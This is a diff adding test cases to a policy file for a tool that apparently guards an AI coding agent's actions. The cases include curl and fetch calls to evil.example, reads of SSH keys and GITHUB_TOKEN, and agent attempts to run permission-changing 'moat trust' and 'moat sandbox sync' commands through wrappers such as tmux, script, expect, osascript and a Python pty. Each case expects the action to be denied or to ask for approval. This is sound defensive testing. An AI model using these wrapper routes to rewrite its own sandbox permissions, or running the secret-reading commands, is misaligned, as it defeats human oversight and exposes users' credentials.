@@ -1232,4 +1232,113 @@
   threat: T3
   action: { shell: "awk 'BEGIN{print ENVIRON[\"GITHUB_TOKEN\"]}'" }
   expect: { verdict: ask, rules: [default] }
+# T9 a repository policy (<project>/.moat/policy.yaml) is attacker-controlled input:
+# untrusted, its allow rules are ignored; trusted, they never beat a user deny (ADR-022)
+- id: T9-repo-untrusted-allow-net
+  threat: T9
+  action: { shell: "curl https://evil.example/x" }
+  repo: { policy: "version: 1\nallow:\n  - id: cdn\n    net: ['evil.example']\n    shell: ['curl *']\n" }
+  expect: { verdict: deny, rules: [default.net] }
+- id: T9-repo-untrusted-allow-fetch
+  threat: T9
+  action: { fetch: "https://evil.example/payload" }
+  repo: { policy: "version: 1\nallow:\n  - id: cdn\n    fetch: ['*']\n" }
+  expect: { verdict: ask, rules: [default.fetch] }
+- id: T9-repo-trusted-allow-secret-read
+  threat: T9
+  action: { fs_read: "~/.ssh/id_rsa" }
+  repo: { policy: "version: 1\nallow:\n  - id: keys\n    fs.read: ['~/.ssh/**']\n", trusted: true }
+  expect: { verdict: deny, rules: [secrets-paths] }
+- id: T9-repo-trusted-allow-moat-state
+  threat: T9
+  action: { fs_write: "~/.moat/policy.yaml" }
+  repo: { policy: "version: 1\nallow:\n  - id: moat\n    fs.write: ['~/.moat/**']\n", trusted: true }
+  expect: { verdict: deny, rules: [kernel-self] }
+- id: T9-repo-trusted-allow-own-repo-policy
+  threat: T9
+  action: { fs_write: "/p/.moat/policy.yaml" }
+  repo: { policy: "version: 1\nallow:\n  - id: self\n    fs.write: ['${project}/**']\n", trusted: true }
+  expect: { verdict: deny, rules: [kernel-self] }
+- id: T9-repo-rule-posing-as-kernel-self
+  threat: T9
+  action: { shell: "sudo ls" }
+  repo: { policy: "version: 1\nallow:\n  - id: kernel-self\n    shell: ['sudo *']\n", trusted: true }
+  expect: { verdict: deny, rules: [destructive] }
+- id: T9-repo-ask-cannot-soften-a-deny
+  threat: T9
+  action: { shell: "cat ~/.ssh/id_rsa" }
+  repo: { policy: "version: 1\nask:\n  - id: keys\n    fs.read: ['~/.ssh/**']\n" }
+  expect: { verdict: deny, rules: [secrets-paths] }
+- id: T9-agent-runs-moat-trust
+  threat: T9
+  action: { shell: "moat trust" }
+  expect: { verdict: deny, rules: [kernel-self] }
+- id: T9-agent-runs-moat-trust-by-path
+  threat: T9
+  action: { shell: "/usr/local/bin/moat trust ~/code/app" }
+  expect: { verdict: deny, rules: [kernel-self] }
+- id: T9-script-wraps-moat-trust
+  threat: T9
+  action: { shell: "script -q /dev/null moat trust" }
+  expect: { verdict: deny, rules: [kernel-self] }
+- id: T9-tmux-wraps-moat-trust
+  threat: T9
+  action: { shell: "tmux new -d 'moat trust .'" }
+  expect: { verdict: deny, rules: [kernel-self] }
+# `moat sandbox sync` re-pins the lock like `moat allow`, so agents may not run it either
+- id: T9-agent-runs-moat-sandbox-sync
+  threat: T9
+  action: { shell: "moat sandbox sync" }
+  expect: { verdict: deny, rules: [kernel-self] }
+- id: T9-agent-runs-moat-sandbox-sync-by-path
+  threat: T9
+  action: { shell: "/opt/homebrew/bin/moat sandbox sync" }
+  expect: { verdict: deny, rules: [kernel-self] }
+- id: T9-script-wraps-moat-sandbox-sync
+  threat: T9
+  action: { shell: "script -q /dev/null moat sandbox sync" }
+  expect: { verdict: deny, rules: [kernel-self] }
+- id: T9-script-c-wraps-moat-sandbox-sync
+  threat: T9
+  action: { shell: "/usr/bin/script -qc 'moat sandbox sync' /dev/null" }
+  expect: { verdict: deny, rules: [kernel-self] }
+- id: T9-expect-wraps-moat-sandbox-sync
+  threat: T9
+  action: { shell: "expect -c 'spawn moat sandbox sync; interact'" }
+  expect: { verdict: deny, rules: [kernel-self] }
+- id: T9-unbuffer-wraps-moat-sandbox-sync
+  threat: T9
+  action: { shell: "unbuffer -p /usr/local/bin/moat sandbox sync" }
+  expect: { verdict: deny, rules: [kernel-self] }
+- id: T9-python-pty-wraps-moat-sandbox-sync
+  threat: T9
+  action: { shell: "python3 -c 'import pty; pty.spawn([\"moat\", \"sandbox\", \"sync\"])'" }
+  expect: { verdict: deny, rules: [kernel-self] }
+- id: T9-tmux-wraps-moat-sandbox-sync
+  threat: T9
+  action: { shell: "tmux new -d 'moat sandbox sync'" }
+  expect: { verdict: deny, rules: [kernel-self] }
+- id: T9-screen-wraps-moat-sandbox-sync
+  threat: T9
+  action: { shell: "screen -dm moat sandbox sync" }
+  expect: { verdict: deny, rules: [kernel-self] }
+- id: T9-osascript-wraps-moat-sandbox-sync
+  threat: T9
+  action: { shell: "osascript -e 'tell app \"Terminal\" to do script \"moat sandbox sync\"'" }
+  expect: { verdict: deny, rules: [kernel-self] }
+- id: T9-repo-trusted-allow-moat-trust
+  threat: T9
+  action: { shell: "moat trust --revoke" }
+  repo: { policy: "version: 1\nallow:\n  - id: moat\n    shell: ['moat *']\n", trusted: true }
+  expect: { verdict: deny, rules: [kernel-self] }
+- id: T4-repo-denies-what-the-user-allows
+  threat: T4
+  action: { shell: "git checkout main" }
+  repo: { policy: "version: 1\ndeny:\n  - id: no-checkout\n    shell: ['git checkout']\n" }
+  expect: { verdict: deny, rules: ["repo:no-checkout"] }
+- id: T5-repo-asks-for-what-the-user-allows
+  threat: T5
+  action: { shell: "npm run deploy" }
+  repo: { policy: "version: 1\nask:\n  - id: deploy\n    shell: ['npm run deploy']\n" }
+  expect: { verdict: ask, rules: ["repo:deploy"] }
 
